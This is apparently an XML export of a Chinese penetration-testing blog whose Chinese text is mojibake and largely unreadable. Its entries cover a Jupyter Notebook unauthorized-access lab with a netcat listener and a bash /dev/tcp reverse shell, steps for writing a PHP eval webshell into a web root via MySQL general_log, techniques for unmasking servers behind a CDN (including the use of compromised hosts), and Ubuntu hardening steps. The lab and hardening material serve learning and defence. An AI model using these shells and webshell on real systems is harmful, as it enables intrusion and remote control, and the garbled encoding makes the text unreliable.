redisåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯ä¸ä¼šç”Ÿæˆæ—¥å¿—æ–‡ä»¶çš„ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œè®©redisç”Ÿæˆæ—¥å¿—ï¼Œä»¥åŠè®¾ç½®æ—¥å¿—ç­‰çº§ ä¿è¯ authorized_keys æ–‡ä»¶çš„å®‰å…¨ï¼ˆchmod 400 ~/.ssh/authorized_keysï¼‰ è®¾ç½®é˜²ç«å¢™ç­–ç•¥ å‚è€ƒé“¾æ¥https://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Qhttps://www.freebuf.com/column/158065.html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>æœªæˆæƒè®¿é—®</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jupyter Notebook æœªæˆæƒè®¿é—®æ¼æ´ç®€å•å¤ç°]]></title>
    <url>%2Fposts%2F59687%2F</url>
    <content type="text"><![CDATA[ç®€ä»‹åŠå±å®³Jupyter Notebook(æ­¤å‰è¢«ç§°ä¸º IPython notebook)æ˜¯ä¸€ä¸€ä¸ªäº¤äº’å¼ç¬”è®°æœ¬,æ”¯æ”¯æŒè¿è¡Œè¡Œè¡Œ 40 å¤šç§ç¼–ç¨‹è¯­è¨€è¨€ã€‚ å¦‚æœç®¡ç†ç†å‘˜æœªä¸ºJupyter Notebooké…ç½®å¯†ç ,å°†å¯¼è‡´æœªæˆæƒè®¿é—®æ¼æ¼æ´æ´,æ¸¸å®¢å¯åœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸€ä¸ªconsoleå¹¶æ‰§è¡Œè¡Œè¡Œä»»æ„Pythonä»£ç å’Œå‘½ä»¤ã€‚ ç¯å¢ƒä»‹ç»# ç›®æ ‡ ç¯å¢ƒæ¥æºï¼šhttps://github.com/vulhub/vulhub/blob/master/jupyter/notebook-rce/ ipåœ°å€ï¼š 192.168.0.100 å¼€å§‹æµ‹è¯•1.è¿è¡Œæµ‹è¯•ç¯å¢ƒï¼š docker-compose up -d 2.è®¿é—®ç›®æ ‡åœ°å€ http://192.168.0.100:8888 3.New &gt; Terminal åˆ›å»ºæ§åˆ¶å°ï¼šå¯ä»¥ç›´æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ 4.åé¢å°±ç›´æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæ¯”å¦‚åå¼¹shellç­‰ # æœ¬æœºç›‘å¬ nc -lvp 5555 # ç›®æ ‡æ‰§è¡Œ bash -i >&amp; /dev/tcp/x.x.x.x/8080 0>&amp;1 é˜²å¾¡æ‰‹æ®µ å¼€å¯èº«ä»½éªŒè¯, é˜²æ­¢æ­¢æœªç»æˆæƒç”¨ç”¨æˆ·è®¿é—® è®¿é—®æ§åˆ¶ç­–ç•¥ç•¥, é™åˆ¶IPè®¿é—®, ç»‘å®šå›ºå®šIP document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>æœªæˆæƒè®¿é—®</tag>
        <tag>Jupyter Notebook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpMyAdminçªç ´secure-file-privå†™WebShell]]></title>
    <url>%2Fposts%2F64672%2F</url>
    <content type="text"><![CDATA[1.æŸ¥çœ‹secure_file_privå€¼ show global variables like '%secure_file_priv%'; # show global variables like '%secure%'; # æ­¤å¼€å…³é»˜è®¤ä¸ºNULLï¼šå³ä¸å…è®¸å¯¼å…¥å¯¼å‡º # æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼šè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ # å€¼ä¸º/tmp/ ï¼šè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹ 2.æŸ¥è¯¢æ“ä½œæ—¥å¿—å­˜æ”¾è·¯å¾„ show variables like 'general_log%'; # æ“ä½œæ—¥å¿—é»˜è®¤ä¹Ÿæ˜¯å…³é—­çš„ 3.é¦–å…ˆæ‰“å¼€æ“ä½œæ—¥å¿—è®°å½• set global general_log = 'ON'; 4.è®¾ç½®æ“ä½œè®°å½•æ—¥å¿—è·¯å¾„(å‰ææ˜¯è·å–åˆ°äº†ç»å¯¹è·¯å¾„) # set global general_log_file='è·¯å¾„åœ°å€'; # é€‰æ‹©ç½‘ç«™çš„ç›®å½•é‡Œé¢ set global general_log_file='D:\\phpstudy\\PHPTutorial\\WWW\\xx.php' 5.æ‰§è¡Œsqlè¯­å¥ï¼Œmysqlä¼šå°†æ‰§è¡Œçš„è¯­å¥å†…å®¹è®°å½•åˆ°æˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼Œå°±å¯ä»¥getshelläº† select '&lt;?php @eval($_POST[1]);?>'; 6.è®¿é—®webshellï¼Œè¿›è¡Œåç»­æ“ä½œ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>phpMyadmin</tag>
        <tag>secure-file-priv</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç»•è¿‡CDNå¯»æ‰¾çœŸå®IP]]></title>
    <url>%2Fposts%2F58846%2F</url>
    <content type="text"><![CDATA[åœ¨æ²¡æœ‰CDNçš„æƒ…å†µä¸‹ï¼Œç›´æ¥pingæˆ–nslookupæˆ–digå³å¯å¾—åˆ°çœŸå®IPåœ°å€ï¼Œä½†æ˜¯æœ‰çš„ç«™ç‚¹ä½¿ç”¨äº†CDNã€‚ä¸¤ç§ç®€å•æ£€æµ‹æœ‰æ— CDNçš„æ–¹æ³•ï¼š å¤šåœ°ping nslookup æ£€æµ‹ï¼ˆå¦‚æœä¸‹æ–¹åŸŸåè§£æå‡ºç°äº†å¤šä¸ªipçš„è¯ï¼ŒåŸºæœ¬å°±ç¡®å®šè¿™ä¸ªç½‘ç«™ä½¿ç”¨äº†CDNæœåŠ¡ï¼‰ ä¸€ã€DNSå†å²è§£æè®°å½•ç›¸å…³æŸ¥è¯¢ç½‘ç«™ï¼š # iphistoryï¼š https://viewdns.info/iphistory/ # DNSæŸ¥è¯¢ï¼š https://dnsdb.io/zh-cn/ # å¾®æ­¥åœ¨çº¿ï¼š https://x.threatbook.cn/ # åŸŸåæŸ¥è¯¢ï¼š https://site.ip138.com/ # DNSå†å²æŸ¥è¯¢ï¼š https://securitytrails.com/ # Netcraftï¼š https://sitereport.netcraft.com/?url=github.com # SecurityTrail äºŒã€æŸ¥æ‰¾å­åŸŸåé‡è¦çš„ç«™ç‚¹ä¼šåšCDNï¼Œè€Œä¸€äº›å­åŸŸåç«™ç‚¹å¹¶æ²¡æœ‰åŠ å…¥CDNï¼Œè€Œä¸”è·Ÿä¸»ç«™åœ¨åŒä¸€ä¸ªCæ®µå†…ï¼Œè¿™æ—¶å€™ï¼Œå°±å¯ä»¥é€šè¿‡æŸ¥æ‰¾å­åŸŸåæ¥æŸ¥æ‰¾ç½‘ç«™çš„çœŸå®IPã€‚å¸¸ç”¨çš„å­åŸŸåæŸ¥æ‰¾æ–¹æ³•å’Œå·¥å…·ï¼š1ã€æœç´¢å¼•æ“æŸ¥è¯¢ï¼šå¦‚Googleã€baiduã€Bingç­‰ä¼ ç»Ÿæœç´¢å¼•æ“ï¼Œsite:baidu.com inurl:baidu.comï¼Œæœtarget.com|å…¬å¸åå­—ã€‚ 2ã€ä¸€äº›åœ¨çº¿æŸ¥è¯¢å·¥å…·ï¼Œå¦‚ï¼š http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ https://dnsdb.io/zh-cn/ https://x.threatbook.cn/ 3ã€ å­åŸŸåçˆ†ç ´å·¥å…· Layerå­åŸŸåæŒ–æ˜æœº wydomainï¼šhttps://github.com/ring04h/wydomain subDomainsBrute:https://github.com/lijiejie/ Sublist3r:https://github.com/aboul3la/Sublist3r å…¶ä»–å·¥å…· ä¸‰ã€ç½‘ç«™é‚®ä»¶å¤´ä¿¡æ¯é‚®ç®±æ³¨å†Œï¼Œé‚®ç®±æ‰¾å›å¯†ç ã€RSSé‚®ä»¶è®¢é˜…ç­‰åŠŸèƒ½åœºæ™¯ï¼Œé€šè¿‡ç½‘ç«™ç»™è‡ªå·±å‘é€é‚®ä»¶ï¼Œä»è€Œè®©ç›®æ ‡ä¸»åŠ¨æš´éœ²ä»–ä»¬çš„çœŸå®çš„IPï¼ŒæŸ¥çœ‹é‚®ä»¶å¤´ä¿¡æ¯ï¼Œè·å–åˆ°ç½‘ç«™çš„çœŸå®IPã€‚ å››ã€ç½‘ç»œç©ºé—´å®‰å…¨å¼•æ“æœç´¢å…³é”®å­—æˆ–ç½‘ç«™åŸŸåï¼Œå°±å¯ä»¥æ‰¾å‡ºè¢«æ”¶å½•çš„IPï¼Œå¾ˆå¤šæ—¶å€™è·å–åˆ°çš„å°±æ˜¯ç½‘ç«™çš„çœŸå®IP # é’Ÿé¦—ä¹‹çœ¼ï¼š https://www.zoomeye.org # Shodanï¼š https://www.shodan.io # Fofaï¼š https://fofa.so # å…¶ä»– äº”ã€åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IPè¯ä¹¦é¢å‘æœºæ„(CA)å¿…é¡»å°†ä»–ä»¬å‘å¸ƒçš„æ¯ä¸ªSSL/TLSè¯ä¹¦å‘å¸ƒåˆ°å…¬å…±æ—¥å¿—ä¸­ï¼ŒSSL/TLSè¯ä¹¦é€šå¸¸åŒ…å«åŸŸåã€å­åŸŸåå’Œç”µå­é‚®ä»¶åœ°å€ã€‚SSLè¯ä¹¦æœç´¢å¼•æ“ï¼š # Censys è¯ä¹¦æœç´¢ https://censys.io/ipv4?q=github.com # å…¶ä»– å…­ã€å›½å¤–ä¸»æœºè§£æåŸŸåå¤§éƒ¨åˆ† CDN å‚å•†å› ä¸ºå„ç§åŸå› åªåšäº†å›½å†…çš„çº¿è·¯ï¼Œè€Œé’ˆå¯¹å›½å¤–çš„çº¿è·¯å¯èƒ½å‡ ä¹æ²¡æœ‰ 1.å›½å¤–å¤šåœ°pingå·¥å…·ï¼š https://asm.ca.com/zh_cn/ping.php http://host-tracker.com/ http://www.webpagetest.org/ https://dnscheck.pingdom.com/ 2.è‡ªå·±æŒ‚ä»£ç† ä¸ƒã€æ‰«æå…¨ç½‘é€šè¿‡Zmapã€masscanç­‰å·¥å…·å¯¹æ•´ä¸ªäº’è”ç½‘å‘èµ·æ‰«æï¼Œé’ˆå¯¹æ‰«æç»“æœè¿›è¡Œå…³é”®å­—æŸ¥æ‰¾ï¼Œè·å–ç½‘ç«™çœŸå®IP 1ã€ZMapå·ç§°æ˜¯æœ€å¿«çš„äº’è”ç½‘æ‰«æå·¥å…·ï¼Œèƒ½å¤Ÿåœ¨45åˆ†é’Ÿæ‰«éå…¨ç½‘ã€‚ https://github.com/zmap/zmap 2ã€Masscanå·ç§°æ˜¯æœ€å¿«çš„äº’è”ç½‘ç«¯å£æ‰«æå™¨ï¼Œæœ€å¿«å¯ä»¥åœ¨å…­åˆ†é’Ÿå†…æ‰«éäº’è”ç½‘ã€‚ https://github.com/robertdavidgraham/masscan æ‰«æå…¨ç½‘å¼€æ”¾ç‰¹å®šç«¯å£çš„IPï¼Œç„¶åè·å–ä»–ä»¬çš„ç‰¹å®šé¡µé¢çš„HTMæºä»£ç ï¼Œç”¨è¿™äº›æºä»£ç å’Œç›®æ ‡ç½‘ç«™çš„ç‰¹å®šé¡µé¢çš„HTMæºä»£ç åšå¯¹æ¯”ï¼Œå¦‚æœåŒ¹é…ä¸Šæ¥äº†ï¼Œå°±å¾ˆå¯èƒ½æ˜¯ç›®æ ‡ç½‘ç«™çš„çœŸå®Pï¼Œå·¥å…·åŒ¹é…ä¼šåŒ¹é…å‡ºæ¥å¾ˆå¤šï¼Œæœ€åè¿˜æ˜¯è¦äººå·¥ç­›é€‰ã€‚ å…«ã€é…ç½®ä¸å½“å¯¼è‡´ç»•è¿‡åœ¨é…ç½®CDNçš„æ—¶å€™ï¼Œéœ€è¦æŒ‡å®šåŸŸåã€ç«¯å£ç­‰ä¿¡æ¯ï¼Œæœ‰æ—¶å€™å°å°çš„é…ç½®ç»†èŠ‚å°±å®¹æ˜“å¯¼è‡´CDNé˜²æŠ¤è¢«ç»•è¿‡ã€‚ æ¡ˆä¾‹1ï¼šä¸ºäº†æ–¹ä¾¿ç”¨æˆ·è®¿é—®ï¼Œæˆ‘ä»¬å¸¸å¸¸å°†www.test.com å’Œ test.com è§£æåˆ°åŒä¸€ä¸ªç«™ç‚¹ï¼Œè€ŒCDNåªé…ç½®äº†www.test.comï¼Œé€šè¿‡è®¿é—®test.comï¼Œå°±å¯ä»¥ç»•è¿‡ CDN äº†ã€‚ æ¡ˆä¾‹2ï¼šç«™ç‚¹åŒæ—¶æ”¯æŒhttpå’Œhttpsè®¿é—®ï¼ŒCDNåªé…ç½® httpsåè®®ï¼Œé‚£ä¹ˆè¿™æ—¶è®¿é—®httpå°±å¯ä»¥è½»æ˜“ç»•è¿‡ã€‚ ä¹ã€é—ç•™æ–‡ä»¶é—ç•™æ–‡ä»¶ï¼ˆæ¯”å¦‚googleé•œåƒï¼Œç™¾åº¦é•œåƒï¼‰æ¯”å¦‚é—ç•™æ–‡ä»¶ä¸­: phpinfoçš„server_ddrå­—æ®µï¼Œ http_x_forwarded_for åã€å…¶ä»–å·¥å…·# fuckcdn https://github.com/Tai7sy/fuckcdn # w8fuckdn https://github.com/boy-hack/w8fuckcdn åä¸€ã€ä»¥é‡æ‰“é‡ä»¥é‡æ‰“é‡ï¼ˆéœ€è¦è‚‰é¸¡ï¼Œcdnçš„æµé‡ç”¨å®Œå°±æ˜¾ç¤ºçœŸå®ipï¼‰ psï¼šè¿™ä¸ªæ–¹æ³•ï¼Œé¢ï¼Œä¹Ÿç®—æ˜¯ä¸ªæ–¹æ³•å§â€¦â€¦ åäºŒã€å…¶ä»–æ–¹æ³•1.ç½‘ç«™æ¼æ´æ¯”å¦‚æœ‰ä»£ç æ‰§è¡Œæ¼æ´ã€SSRFã€å­˜å‚¨å‹çš„XSSéƒ½å¯ä»¥è®©æœåŠ¡å™¨ä¸»åŠ¨è®¿é—®æˆ‘ä»¬é¢„è®¾çš„webæœåŠ¡å™¨ï¼Œé‚£ä¹ˆå°±èƒ½åœ¨æ—¥å¿—é‡Œé¢çœ‹è§ç›®æ ‡ç½‘ç«™æœåŠ¡å™¨çš„çœŸå®IP 2.é…åˆæœ¬åœ°hostsæ–‡ä»¶ç”¨è¶…çº§ping æ‰«å­åŸŸå å†ç»§ç»­ã€ åŠget-site-ipè·å– (ä¿®æ”¹hostçš„æ˜ å°„ï¼Œå¦‚èƒ½æ­£å¸¸è®¿é—®ï¼Œè¿™ipå°±æ˜¯æ­£ç¡®çš„ï¼Œè¿›ä¸€æ­¥ä½¿ç”¨ä»£ç†æ¥æ‰¾å‡ºçœŸæ˜¯ip) åä¸‰ã€ä¸€é”®å¹²æ­»CDN åŒ…å«äº†å¤¸å¼ å› ç´ ï¼Œé’ˆå¯¹å¤§å…¬å¸çš„æ•ˆæœæ¯”è¾ƒå¥½ï¼Œä½“é‡å°çš„ç½‘ç«™ï¼ŒåŸºæœ¬æœä¸åˆ° 1.å…ˆæŸ¥çœ‹ç½‘ç«™logoçš„hashå€¼è¿™é‡Œpython2æ¥è®¡ç®—ï¼š import mmh3 # mmh3å®‰è£…éœ€è¦å…ˆå®‰è£…vc++4.0 import requests response = requests.get('https://www.xiaodi8.com/img/favicon.ico') favicon = response.content.encode('base64') hash = mmh3.hash(favicon) print 'http.favicon.hash:'+str(hash) # å¯ä»¥icoæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ç‰¹å¾æ˜æ˜¾çš„å›¾ç‰‡ç­‰ 2.ç„¶åshodanæœç´¢ï¼š # å¯¹ç‰¹å¾æ˜æ˜¾çš„å›¾ç‰‡ç­‰çš„hashè¿›è¡Œæœç´¢ http.favicon.hash:-1507567567 å‚è€ƒæ–‡ç«  https://mp.weixin.qq.com/s/JkqLu0SBcOGIq7JdLzj8Uw # ByPass, æˆ‘åœ¨æ­¤åŸºç¡€ä¸Šè¡¥å……äº†è‡ªå·±ä¹‹å‰çš„å†…å®¹ https://www.cnblogs.com/zuoxiaolongzzz/p/12496467.html # é€šè¿‡shodanæœç´¢ç›¸åŒfavicon.icoçš„ç½‘ç«™ https://www.cnblogs.com/miaodaren/p/9177379.html # Shodançš„http.favicon.hashè¯­æ³•è¯¦è§£ä¸ä½¿ç”¨æŠ€å·§ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>CDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-å®‰å…¨ç›¸å…³è®¾ç½®]]></title>
    <url>%2Fposts%2F19808%2F</url>
    <content type="text"><![CDATA[142-å®‰å…¨è®¾ç½®Linuxé»˜è®¤å®‰è£…å·²ç»å¾ˆå®‰å…¨ï¼Œå½“å¾ˆå¤šçš„äº†è§£å®‰å…¨ä»éå¸¸å¿…è¦æ‰“é€ ä¸€ä¸ªç›¸å½“å®‰å…¨çš„ç³»ç»Ÿï¼ˆå¢åŠ å…¥ä¾µè€…çš„æˆæœ¬ï¼Œå®‰å…¨ä¹Ÿæ˜¯è¦è€ƒè™‘æˆæœ¬çš„ï¼‰ å¤§éƒ¨åˆ†çš„å®‰å…¨äº‹ä»¶æ¥è‡ªäºå†…éƒ¨å‘˜å·¥å’Œå·²ç»ç¦»èŒçš„å‘˜å·¥ é˜²æŠ¤æ€è·¯ é£é™©è¯„ä¼°ï¼šæ”»å‡»é¢ åˆ¶å®šç­–ç•¥ï¼šæœ€å°åŒ–ã€æ˜ç¡®éœ€æ±‚ å®‰å…¨ç®¡ç†ï¼šå®‰å…¨æ˜¯ç®¡ç† åº”æ€¥é¢„æ¡ˆï¼šçªå‘äº‹ä»¶ å¨èƒæƒ…æŠ¥ï¼šäº†è§£å®‰å…¨è¡Œä¸š å¸¸è§é”™è¯¯ç†è§£ å®‰å…¨æ˜¯å®‰å…¨ä»ä¸šè€…çš„äº‹æƒ… ä¸ºäº†å®‰è£…ç®€å•ï¼Œè£…æ‰€æœ‰çš„åŒ…ï¼Œå¼€æ‰€æœ‰çš„æœåŠ¡(ç‰ˆæœ¬å·ã€bannerä¿¡æ¯) æœ‰äº†è¾¹ç•Œé˜²ç«å¢™åˆ™ä¸éœ€è¦ä¸»æœºé˜²ç«å¢™ éšæ„å¼€æ”¾å„ç§è®¿é—®æ–¹å¼(åé—¨) å…¬å¸å†…éƒ¨ç½‘ç»œæ˜¯å®‰å…¨çš„ å¸å·ç®¡ç†ç”¨æˆ·ç®¡ç†æ˜¯ç³»ç»Ÿå®‰å…¨æœ€é‡è¦çš„æ–¹é¢ å¯†ç ç­–ç•¥ æƒé™æ§åˆ¶ Ubuntué»˜è®¤ç¦ç”¨rootå¸å·ä½¿ç”¨ä¸åŒ¹é…ä»»ä½•åŠ å¯†å€¼çš„å¯†ç ï¼Œæ— æ³•ç›´æ¥ç™»é™†(sudo)è®¾ç½®å¯†ç ä¹‹åå³å¯å¯ç”¨rootç™»å½•å®‰è£…è¿‡ç¨‹åˆ›å»ºçš„ç”¨æˆ·å¸å·é»˜è®¤å±äºsudoç»„ sudo passwd # è®¾ç½®rootå¯†ç (è¿˜æ˜¯ä¸å»ºè®®ä½¿ç”¨rootç™»å½•ç³»ç»Ÿ) sudo passwd -l root # ç¦ç”¨rootå¸å·å¯†ç (ç”¨å®Œä¹‹åè§£é”: -u) sudo passwd -u root å¢åŠ ç®¡ç†å‘˜å¸å· sudo usermod -aG sudo xps # åŠ å…¥sudoç»„ sudo viudo # æœ¬è´¨æ˜¯ç¼–è¾‘ /etc/sudoers sudo su # å°½é‡å‡å°‘ç®¡ç†å‘˜å¸å·æ•°é‡ # ç¦»èŒæ‰‹ç»­åŠå®Œä¹‹å‰ï¼Œè¦æŠŠä»–çš„å¸å·ç¦ç”¨ç„¶åé€æ¸åˆ é™¤ å¤šç”¨æˆ·ç¯å¢ƒä¸‹ï¼Œç”¨æˆ·ä¸»ç›®å½•é»˜è®¤æƒé™æ˜¯å…¨å±€å¯è¯» ls -ld /home/username # æ‰‹åŠ¨ä¿®æ”¹æƒé™(ä¸å»ºè®®-Rï¼Œä¼šæœ‰ä¸€äº›ä½¿ç”¨çš„é—®é¢˜) sudo chmod 0750 /home/username # é¢„å…ˆä¿®æ”¹é…ç½®ï¼ˆæ–°æ·»åŠ çš„å¸å·æƒé™éƒ½ç¡®å®šäº†ï¼‰ sudo vi /etc/adduser.conf DIR_MODE=0750 # å†æ·»åŠ ç”¨æˆ·ï¼Œä¸»ç›®å½•æƒé™å°±æ˜¯æˆ‘ä»¬è§„å®šçš„äº† sudo adduser username å¯†ç å¤æ‚åº¦ # ä½¿ç”¨sudoè®¾ç½®å¯†ç æ—¶ ä¸å—å¯†ç è§„åˆ™é™åˆ¶ # ç¼–è¾‘é…ç½®æ–‡ä»¶ sudo vi /etc/pam.d/common-password password [success=1 default=ignore] pam_unix.so obscure sha512 minlen=8 lcredit=1 ucredit=1 dcredit=2 ocredit=1 # minlen æœ€å°é•¿åº¦ # lcredit æœ€å°‘åŒ…å«çš„å°å†™å­—æ¯ä¸ªæ•° # ucredit æœ€å°‘åŒ…å«çš„å¤§å†™å­—æ¯ä¸ªæ•° # dcredit æœ€å°‘åŒ…å«çš„æ•°å­—ä¸ªæ•° # ocredit æœ€å°‘åŒ…å«çš„å…¶ä»–å­—ç¬¦ä¸ªæ•° å¯†ç è¿‡æœŸ sudo chage -l username # æŸ¥çœ‹ç”¨æˆ·å¸å· # è®¾ç½®å¯†ç è¿‡æœŸæ—¶é—´ sudo chage -E 01/31/2015 -m 5 -M 90 -I 30 -W 14 username # -E å¯†ç è¿‡æœŸæ—¶é—´ # -m / -M å¯†ç ä½¿ç”¨æœŸé™ # -I å¯†ç è¿‡æœŸåå¤šå°‘å¤©ä»å¯ä»¥æ”¹å¯†ç ï¼Œè¿‡æœŸé”å®šå¸å· # -W è¿‡æœŸå‰å¤šå°‘å¤©è­¦å‘Š å¸å·SSHç™»å½•åº”ç”¨å’ŒæœåŠ¡ä½¿ç”¨å…¶ä»–èº«ä»½è®¤è¯æœºåˆ¶ï¼Œéœ€è¦å•ç‹¬é…ç½®å¸å·å®‰å…¨é”å®šå¸å·æ— æ³•æ˜¯æ— æ³•ç»„ç»‡å…¬é’¥è®¤è¯çš„SSHè¿œç¨‹ç™»å½•ç”¨æˆ· # åˆ é™¤ .sshç›®å½• ~/.ssh/authorized_keys ç¦ç”¨å¸å·ä¸ä¼šå¼ºåˆ¶æ–­å¼€å·²ç»å»ºç«‹çš„SSHè¿æ¥ who |grep username # æŸ¥è¯¢ç”¨æˆ· pt/num ç»ˆç«¯ sudo pkill -f pts/num # å¼ºåˆ¶è¸¢æ‰ æŒ‡å®šå¯SSHè¿œç¨‹ç™»å½•çš„ç”¨æˆ· sudo vi /etc/ssh/sshd_config # éœ€é‡å¯æœåŠ¡ç”Ÿæ•ˆ AllowGroups sshlogin # è®¾ç½®å…è®¸çš„ç»„ # åˆ›å»ºsshç™»å½•ç»„ï¼Œåˆ›å»ºå±äºsshloginç»„çš„ç”¨æˆ· sudo addgroup sshlogin &amp;&amp; sudo adduser username sshlogin æ§åˆ¶å°å®‰å…¨ # ä¸€èˆ¬ï¼Œå¯ç”¨æœºå™¨åï¼Œåˆ°äº†ç™»å½•ç•Œé¢ï¼Œä¸ç”¨ç™»å½•å³å¯è¿›è¡Œè¿œç¨‹è¿æ¥ï¼Œå…¶ä»–æœåŠ¡ä¹Ÿå°…å¯åŠ¨äº† # é¿å…è¯¯è§¦ï¼Œå»ºè®®ç¦ç”¨ctrl+Alt+Delete å¿«æ·é”®é‡å¯ sudo systemctl mask ctrl-alt-del.target sudo systemctl daemon-reload ç³»ç»Ÿä¿¡æ¯å½“å‰ç™»å½•å¸å· # æŸ¥çœ‹ç™»å½•ä¼šè¯ w # TTY1 æ˜¯æœ¬åœ°ç™»å½•ï¼Œpts/0 æ˜¯è¿œç¨‹ç»ˆç«¯ # å­—æ®µï¼š ç”¨æˆ·-ç»ˆç«¯-æ¥æº-ç™»å½•æ—¶é—´-å‘å‘†æ—¶é—´(ç©ºé—²)---å½“å‰æ­£åœ¨è¿è¡Œçš„ç¨‹åº xps@xps:~$ w 08:51:23 up 1:15, 3 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT xps tty1 - 08:49 1:47 0.09s 0.04s -bash xps pts/0 192.168.0.115 07:37 1.00s 0.23s 0.01s w xps pts/1 192.168.0.115 08:49 3.00s 0.07s 0.03s vim 1.txt å†å²ç™»å½•ä¿¡æ¯ last -d # ä»ä¸‹å¾€ä¸Šçœ‹ #xps pts/0 bogon Tue May 19 07:37 still logged in #reboot system boot 4.15.0-99-generi Tue May 19 07:36 still running # ç³»ç»Ÿå¯åŠ¨ä¹‹åï¼Œå°±ä¼šæ˜¾ç¤ºrebootçš„ä¸€æ¡è®°å½•ï¼Œæ˜¾ç¤ºå†…æ ¸ä¿¡æ¯ lsofå‘½ä»¤Linuxä¸­ä¸€åˆ‡çš†æ–‡ä»¶ï¼Œè¿è¡Œä¸­çš„æ–‡ä»¶æˆä¸ºè¿›ç¨‹ç›®å½•ä¸­è¢«æ‰“å¼€çš„æ–‡ä»¶ sudo lsof +D /home/xps lsof |grep /var/log/ #æŸ¥çœ‹/var/log/ä¸‹çš„æ–‡ä»¶è¢«å“ªäº›è¿›ç¨‹æ‰“å¼€ ç”¨æˆ·æ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶ sudo lsof -u xps sudo lsof -u ^xps # é™¤äº†xpsè´¦æˆ·ä¹‹å¤– lsof -u 0 #æŸ¥çœ‹uidä¸º0çš„ç”¨æˆ·æ‰“å¼€çš„æ–‡ä»¶ï¼ˆuidä¸º0ä»£è¡¨æ˜¯rootï¼‰ ç»“æŸæŒ‡å®šç”¨æˆ·çš„æ‰€æœ‰è¿›ç¨‹ sudo kill -p `lsof -t -u xps` # -tæå–pidå€¼ åˆ—å‡ºæ‰€æœ‰çš„ç½‘ç»œè¿æ¥ sudo lsof -i # ç±»ä¼¼ ss å‘½ä»¤ lsof -i:22 #æŸ¥çœ‹22ç«¯å£éƒ½æœ‰å“ªäº›è¿›ç¨‹åœ¨è®¿é—® lsof -p 1168 #æŸ¥çœ‹1168è¿›ç¨‹å·æ‰€æ‰“å¼€çš„æ–‡ä»¶ lsof -c sshd #æŸ¥çœ‹sshdæœåŠ¡æ‰“å¼€çš„æ–‡ä»¶ å…¶ä»– ## åˆ©ç”¨lsofæ¢å¤å·²åˆ é™¤æ–‡ä»¶(æ—¥å¿—è¢«åˆ é™¤åå¯ä»¥è¿™æ ·) lsof |grep /var/log/messages #ä»¥meaagesæ—¥å¿—ä¸ºä¾‹,æŸ¥çœ‹çŠ¶æ€ï¼Œè®°ä½ç¼–å·id cd /proc/xx_åˆšæ‰çš„id/fd ls -l suid /sgidçš„å®‰å…¨éšæ‚£ # suid åœ¨åœ¨userçš„xä½ç½®å¤šäº†ä¸ªSã€‚åœ¨ç”¨æˆ·æ‰§è¡Œè¯¥ç¨‹åºæ—¶,ç”¨æˆ·çš„æƒé™åº¦æ˜¯è¯¥ç¨‹åºæ–‡ä»¶å±ä¸»çš„æƒé™ã€‚ # sgidä¸suidç±»ä¼¼ï¼Œåªæ˜¯æ‰§è¡Œç¨‹åºæ—¶è·å¾—çš„æ˜¯æ–‡ä»¶å±ç»„çš„æƒé™ã€‚ # 